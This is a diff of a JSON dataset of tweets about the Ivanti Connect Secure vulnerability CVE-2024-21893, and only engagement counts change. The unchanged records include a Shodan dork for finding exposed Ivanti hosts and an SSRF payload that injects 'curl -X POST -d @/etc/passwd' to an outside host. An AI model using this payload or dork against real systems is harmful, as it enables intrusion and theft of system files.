@@ -111,20 +111,20 @@
     "expanded_url": [
         "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-21893.yaml"
     ],
-    "tweetfavorites": 235,
+    "tweetfavorites": 236,
     "tweetquotes": 0,
-    "tweetreplies": 1,
-    "tweetretweets": 59,
+    "tweetreplies": 2,
+    "tweetretweets": 60,
     "tweettext": "🚨 CVE-2024-21893 - Ivanti SAML - Server Side Request Forgery (SSRF) - [HIGH]\n\nNuclei Template : https://t.co/55uoZubwnV @pdnuclei\n\n#hackwithautomation #bugbounty #cve2023 #Ivanti https://t.co/ftGTQudUhm",
     "tweettime": "2024-02-03, 08:59:48",
     "tweeturl": "https://twitter.com/DhiyaneshDK/status/1753704828457377805",
     "username": "DhiyaneshDK"
 }
 {
-    "tweetfavorites": 222,
+    "tweetfavorites": 225,
     "tweetquotes": 0,
     "tweetreplies": 3,
-    "tweetretweets": 47,
+    "tweetretweets": 49,
     "tweettext": "💀 SSRF leading to RCE in Ivanti Connect Secure. (CVE-2024-21893)\n\nDork for Shodan:\n http.favicon.hash:-1439222863 html:\"welcome.cgi?p=logo\"\n\n#web #cve #ssrf #rce #dork #bug https://t.co/rYEjcH9AFA",
     "tweettime": "2024-02-03, 08:52:41",
     "tweeturl": "https://twitter.com/TodayCyberNews/status/1753703040597770241",
@@ -205,10 +205,10 @@
         "https://attackerkb.com/topics/FGlK1TVnB2/cve-2024-21893/rapid7-analysis",
         "http://xxxxxxxx.oastify.com"
     ],
-    "tweetfavorites": 478,
+    "tweetfavorites": 487,
     "tweetquotes": 3,
     "tweetreplies": 8,
-    "tweetretweets": 107,
+    "tweetretweets": 111,
     "tweettext": "CVE-2024-21893 Ivanti Connect Secure  SSRF to CVE-2024-21887 RCE \n\nhttps://t.co/gQGmC9Zb8n\n\nhttps://t.co/G2hE2Ie9kD\n\nhttp://127.0.0.1:8090/api/v1/license/keys-status/;curl -X POST -d @/etc/passwd https://t.co/f1OC82e4PX; https://t.co/0BKDAAU9E3",
     "tweettime": "2024-02-02, 23:23:57",
     "tweeturl": "https://twitter.com/h4x0r_dz/status/1753559912779546954",
